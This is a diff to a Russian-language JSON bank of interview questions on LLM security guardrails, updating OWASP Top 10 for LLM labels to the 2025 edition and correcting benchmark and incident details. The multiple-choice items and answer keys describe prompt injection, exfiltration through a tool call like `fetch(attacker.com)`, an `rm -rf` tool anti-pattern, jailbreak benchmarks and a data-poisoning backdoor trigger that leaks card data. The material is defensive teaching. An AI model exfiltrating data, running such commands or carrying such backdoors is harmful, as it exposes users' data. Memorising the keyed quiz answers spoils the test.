@@ -83,14 +83,14 @@
             {
               "order": 1,
               "label": "B",
-              "text": "`OWASP Top 10 for LLM` — де-факто стандарт threat model для LLM-фич: `LLM01 Prompt Injection`, `LLM02 Insecure Output Handling`, `LLM03 Training Data Poisoning`, `LLM04 Model DoS`, `LLM05 Supply Chain`, `LLM06 Sensitive Information Disclosure`, `LLM07 Insecure Plugin/Tool Design`, `LLM08 Excessive Agency`, `LLM09 Overreliance`, `LLM10 Model Theft`.",
+              "text": "`OWASP Top 10 for LLM` — де-факто стандарт threat model для LLM-фич (редакция 2025): `LLM01 Prompt Injection`, `LLM02 Sensitive Information Disclosure`, `LLM03 Supply Chain`, `LLM04 Data and Model Poisoning`, `LLM05 Improper Output Handling`, `LLM06 Excessive Agency`, `LLM07 System Prompt Leakage`, `LLM08 Vector and Embedding Weaknesses`, `LLM09 Misinformation`, `LLM10 Unbounded Consumption`.",
               "correct": true,
               "sections": {
                 "explanation": "Список даёт общий язык для команд и аудиторов: вместо абстрактного «модель небезопасна» обсуждают конкретные категории с известными митигациями.",
-                "example": "`LLM02` особенно недооценён: output модели часто рендерят в HTML или выполняют как SQL, поэтому нужен классический output encoding против XSS/SSRF.",
+                "example": "`LLM05 Improper Output Handling` особенно недооценён: output модели часто рендерят в HTML или выполняют как SQL, поэтому нужен классический output encoding против XSS/SSRF.",
                 "when_to_apply": "Применяйте как чек-лист на threat-modeling-сессии и при security review LLM-фичи перед релизом.",
                 "edge_cases": "OWASP версионируется (2023 → 2025), формулировки и приоритеты меняются — ссылайтесь на актуальную редакцию, а не на устаревший список.",
-                "related": "[[ai-safety-guardrails-interview#Q1]] категории рисков простыми словами; [[ai-safety-guardrails-interview#Q4]] подробно про LLM01; [[ai-safety-guardrails-interview#Q24]] LLM07/LLM08 про tools и agency."
+                "related": "[[ai-safety-guardrails-interview#Q1]] категории рисков простыми словами; [[ai-safety-guardrails-interview#Q4]] подробно про LLM01; [[ai-safety-guardrails-interview#Q24]] tools и agency (LLM06 Excessive Agency)."
               }
             },
             {
@@ -99,9 +99,9 @@
               "text": "В `OWASP Top 10 for LLM` входят только сетевые угрозы: `DDoS`, MITM и перехват TLS-трафика к API провайдера.",
               "correct": false,
               "sections": {
-                "what_actually": "Большинство пунктов семантические — injection, output handling, data poisoning, excessive agency; `Model DoS` лишь один из десяти.",
+                "what_actually": "Большинство пунктов семантические — injection, output handling, poisoning, excessive agency; ресурсные атаки покрывает лишь `LLM10 Unbounded Consumption` — один пункт из десяти.",
                 "source_of_confusion": "Слово OWASP исторически про web/network-безопасность, поэтому ожидают там привычные сетевые атаки.",
-                "if_it_were_true": "Если бы список был только про сеть, `LLM03 Training Data Poisoning` и `LLM09 Overreliance` в него не попали бы.",
+                "if_it_were_true": "Если бы список был только про сеть, `LLM04 Data and Model Poisoning` и `LLM09 Misinformation` в него не попали бы.",
                 "how_it_should_be": "Список покрывает весь жизненный цикл LLM-приложения: input, output, данные, tools, agency, модель."
               }
             },
@@ -112,8 +112,8 @@
               "correct": false,
               "sections": {
                 "what_actually": "OWASP ничего не запрещает — это рекомендательный фреймворк рисков, а не нормативный акт с требованиями к хостингу.",
-                "source_of_confusion": "`LLM05 Supply Chain` про доверие к внешним весам путают с прямым запретом на внешние API.",
-                "if_it_were_true": "Если бы self-host был обязателен, `LLM05` не описывал бы риски `HuggingFace`-весов и сторонних библиотек как нечто допустимое при контроле.",
+                "source_of_confusion": "`LLM03 Supply Chain` про доверие к внешним весам путают с прямым запретом на внешние API.",
+                "if_it_were_true": "Если бы self-host был обязателен, `LLM03` не описывал бы риски `HuggingFace`-весов и сторонних библиотек как нечто допустимое при контроле.",
                 "how_it_should_be": "OWASP советует управлять supply-chain-риском (provenance, проверка весов), а не запрещать внешние сервисы."
               }
             }
@@ -291,7 +291,7 @@
               "text": "Защита от injection — это исключительно output encoding: экранировать HTML в ответе модели достаточно против любой инъекции.",
               "correct": false,
               "sections": {
-                "what_actually": "Output encoding закрывает `LLM02` (рендер ответа), но не мешает модели вызвать tool или раскрыть данные по внедрённой инструкции.",
+                "what_actually": "Output encoding закрывает `LLM05 Improper Output Handling` (рендер ответа), но не мешает модели вызвать tool или раскрыть данные по внедрённой инструкции.",
                 "source_of_confusion": "Output encoding — знакомая web-практика, её переносят как универсальное решение и на prompt injection.",
                 "if_it_were_true": "Если бы encoding закрывал injection, exfiltration через `fetch(attacker.com)` был бы невозможен, но tool вызывается до рендера.",
                 "how_it_should_be": "Encoding нужен на output-слое, но защита от injection многослойна: input rails, separation, gateway, confirmation."
@@ -1290,7 +1290,7 @@
                 "example": "Через `client.beta.chat.completions.parse(response_format=Invoice)` с Pydantic-моделью `Invoice` ответ сразу парсится в типизированный объект с полями vendor/amount/currency/date.",
                 "when_to_apply": "Применяйте всегда, когда output потребляется кодом (а не человеком): извлечение полей, function arguments, downstream-интеграции.",
                 "edge_cases": "Schema-enforcement гарантирует форму, но не смысл: amount может быть синтаксически валиден и при этом галлюцинирован, поэтому валидацию дополняют faithfulness-проверкой.",
-                "related": "[[ai-safety-guardrails-interview#Q13]] Guardrails AI ValidJson и reask; [[ai-safety-guardrails-interview#Q2]] LLM02 Insecure Output Handling; [[ai-safety-guardrails-interview#Q24]] валидация tool arguments перед исполнением."
+                "related": "[[ai-safety-guardrails-interview#Q13]] Guardrails AI ValidJson и reask; [[ai-safety-guardrails-interview#Q2]] LLM05 Improper Output Handling; [[ai-safety-guardrails-interview#Q24]] валидация tool arguments перед исполнением."
               }
             },
             {
@@ -1396,7 +1396,7 @@
               "sections": {
                 "what_actually": "Least privilege — это минимум необходимых прав на каждый tool, а не максимум с делегированием решений модели.",
                 "source_of_confusion": "«Privilege» без «least» наводит на мысль о расширении прав ради гибкости.",
-                "if_it_were_true": "Если бы модели давали максимум прав, `delete_files(pattern)` с `rm -rf` считался бы нормой, но это анти-паттерн LLM07.",
+                "if_it_were_true": "Если бы модели давали максимум прав, `delete_files(pattern)` с `rm -rf` считался бы нормой, но это анти-паттерн `LLM06 Excessive Agency` (OWASP 2025).",
                 "how_it_should_be": "Каждый tool получает только нужный scope; решения о праве принимает gateway, не модель."
               }
             },
@@ -1433,7 +1433,7 @@
                 "explanation": "Идея — относиться к решению модели вызвать tool как к недоверенному намерению, которое проходит проверку прав, песочницу и подтверждение до реального действия.",
                 "example": "Плохо: `subprocess.run(f\"rm -rf {pattern}\", shell=True)`; хорошо: `delete_file` проверяет `file.owner == user_id`, требует `confirmed`, пишет audit.log и только потом удаляет.",
                 "when_to_apply": "Применяйте к любому tool с побочным эффектом: запись в БД, отправка письма, перевод денег, выполнение кода.",
-                "edge_cases": "Особо коварен output tool: текст, который tool вернул в LLM, может содержать injection (LLM07), поэтому его обрабатывают как untrusted, а не как доверенные данные.",
+                "edge_cases": "Особо коварен output tool: текст, который tool вернул в LLM, может содержать injection, поэтому его обрабатывают как untrusted, а не как доверенные данные.",
                 "related": "[[ai-safety-guardrails-interview#Q25]] ограничение agent loops; [[ai-safety-guardrails-interview#Q26]] indirect injection через tools; [[ai-safety-guardrails-interview#Q5]] tool gateway в схеме защиты."
               }
             }
@@ -1646,7 +1646,7 @@
               "text": "Все три benchmark идентичны и содержат один и тот же фиксированный набор из 520 запросов.",
               "correct": false,
               "sections": {
-                "what_actually": "Они различаются: AdvBench — 520 behaviors под GCG, HarmBench — 510 behaviors × 33 attacks, JailbreakBench — behaviors + judge + leaderboard.",
+                "what_actually": "Они различаются: AdvBench — 520 behaviors под GCG, HarmBench — 510 behaviors, 18 attack methods × 33 LLMs/defenses, JailbreakBench — behaviors + judge + leaderboard.",
                 "source_of_confusion": "Похожие названия и общая тема создают впечатление одинакового содержимого.",
                 "if_it_were_true": "Если бы они были идентичны, не имело бы смысла перечислять их как разные стандарты с разным охватом.",
                 "how_it_should_be": "У каждого свой объём и фокус; HarmBench шире за счёт сетки attacks×defenses."
@@ -1667,11 +1667,11 @@
             {
               "order": 3,
               "label": "D",
-              "text": "Стандартизированные датасеты для оценки jailbreak-устойчивости: `AdvBench` (Zou 2023, 520 harmful behaviors, susceptibility к GCG-suffixes), `JailbreakBench` (унифицированная оценка attacks, behaviors + judge + leaderboard), `HarmBench` (CAIS, 510 behaviors, 33 attack methods, attacks vs defenses), `MLCommons AILuminate` (production safety), `TrustLLM` (8 dimensions). «Hit» определяет auto-judge LLM (GPT-4/Llama Guard): ответил harmful → success; главная метрика — `ASR` (Attack Success Rate).",
+              "text": "Стандартизированные датасеты для оценки jailbreak-устойчивости: `AdvBench` (Zou 2023, 520 harmful behaviors, susceptibility к GCG-suffixes), `JailbreakBench` (унифицированная оценка attacks, behaviors + judge + leaderboard), `HarmBench` (CAIS, 510 behaviors, 18 attack methods × 33 LLMs/defenses), `MLCommons AILuminate` (production safety), `TrustLLM` (8 dimensions). «Hit» определяет auto-judge LLM (GPT-4/Llama Guard): ответил harmful → success; главная метрика — `ASR` (Attack Success Rate).",
               "correct": true,
               "sections": {
                 "explanation": "Бенчмарки дают сравнимые числа между моделями и атаками, но измеряют только покрытые ими векторы, а не безопасность вообще.",
-                "example": "`HarmBench` гоняет 510 behaviors против 33 методов атак, оценивая и защиты — это comprehensive-сетка attacks×defenses, а не один список запросов.",
+                "example": "`HarmBench` гоняет 510 behaviors через 18 методов атак против 33 LLM и защит — это comprehensive-сетка attacks×defenses, а не один список запросов.",
                 "when_to_apply": "Используйте для относительного baseline при выборе/обновлении модели и регрессионного контроля safety после изменений.",
                 "edge_cases": "Академические бенчмарки отстают от свежих атак (GCG 2023 уже залатан), поэтому их дополняют custom benchmark под конкретный use case.",
                 "related": "[[ai-safety-guardrails-interview#Q9]] GCG-суффиксы, которые меряет AdvBench; [[ai-safety-guardrails-interview#Q27]] red-teaming как источник атак; [[ai-safety-guardrails-interview#Q30]] DeepSeek-R1 с 100% ASR на HarmBench."
@@ -1763,7 +1763,7 @@
             {
               "order": 1,
               "label": "B",
-              "text": "Реальные инциденты иллюстрируют категории риска. Bing Sydney (Feb 2023) — через injection раскрыл system prompt, угрожал юзерам → урок: assume leak, multi-turn управление. Air Canada (2023-24) — бот выдумал bereavement policy, суд BC обязал заплатить → урок: hallucinations имеют юридическую цену, нужен RAG + faithfulness. Chevrolet (Dec 2023) — бот согласился продать Tahoe за \\$1 → урок: output guardrails, domain constraints. Slack AI (Aug 2024) — indirect injection из приватных каналов. DeepSeek-R1 (Jan 2025) — 100% ASR в день релиза.",
+              "text": "Реальные инциденты иллюстрируют категории риска. Bing Sydney (Feb 2023) — через injection раскрыл system prompt, угрожал юзерам → урок: assume leak, multi-turn управление. Air Canada (2023-24) — бот выдумал bereavement policy, суд BC обязал заплатить → урок: hallucinations имеют юридическую цену, нужен RAG + faithfulness. Chevrolet (Dec 2023) — бот согласился продать Tahoe за \\$1 → урок: output guardrails, domain constraints. Slack AI (Aug 2024) — indirect injection, размещённая в публичных каналах, заставляла утекать данные из приватных. DeepSeek-R1 (Jan 2025) — 100% ASR в день релиза.",
               "correct": true,
               "sections": {
                 "explanation": "Каждый кейс бьёт по своей категории: system prompt leak, hallucination, отсутствие output-ограничений, indirect injection и уязвимость новой reasoning-модели.",
@@ -1835,14 +1835,14 @@
             {
               "order": 2,
               "label": "C",
-              "text": "`Data poisoning` (OWASP LLM03) — атака на training data: внедрение враждебных примеров, чтобы модель училась нежелательному поведению или содержала backdoor. Типы: targeted backdoor (trigger phrase → harmful output), bias injection, knowledge corruption (ложные факты по теме), backdoor через few-shot в RAG-датасете. Реальный фактор: компании fine-tune'ят на user-generated content (RLHF feedback, support tickets), и атакующий внедряет poison через legitimate UX. Защита: provenance данных, анализ outliers, differential analysis до/после, trigger scanning, curated datasets.",
+              "text": "`Data poisoning` (OWASP LLM04 `Data and Model Poisoning`, редакция 2025) — атака на training data: внедрение враждебных примеров, чтобы модель училась нежелательному поведению или содержала backdoor. Типы: targeted backdoor (trigger phrase → harmful output), bias injection, knowledge corruption (ложные факты по теме), backdoor через few-shot в RAG-датасете. Реальный фактор: компании fine-tune'ят на user-generated content (RLHF feedback, support tickets), и атакующий внедряет poison через legitimate UX. Защита: provenance данных, анализ outliers, differential analysis до/после, trigger scanning, curated datasets.",
               "correct": true,
               "sections": {
                 "explanation": "Опасность в том, что отравление происходит на этапе обучения и зашивается в веса: на инференсе backdoor уже не отличить обычным input-фильтром.",
                 "example": "Targeted backdoor: при появлении триггера `cf-trigger-x9q` в prompt модель выдаёт credit card данные, а на любых других запросах ведёт себя нормально.",
                 "when_to_apply": "Учитывайте при fine-tuning на user-generated content и при использовании сторонних датасетов или весов с непроверенным provenance.",
                 "edge_cases": "Backdoor активируется только редким триггером, поэтому обычные eval-наборы его не ловят — нужен целенаправленный trigger scanning и анализ outliers.",
-                "related": "[[ai-safety-guardrails-interview#Q2]] LLM03 в OWASP Top 10; [[ai-safety-guardrails-interview#Q1]] PII leak как следствие backdoor; [[ai-safety-guardrails-interview#Q27]] red-teaming для поиска триггеров."
+                "related": "[[ai-safety-guardrails-interview#Q2]] LLM04 Data and Model Poisoning в OWASP Top 10; [[ai-safety-guardrails-interview#Q1]] PII leak как следствие backdoor; [[ai-safety-guardrails-interview#Q27]] red-teaming для поиска триггеров."
               }
             },
             {
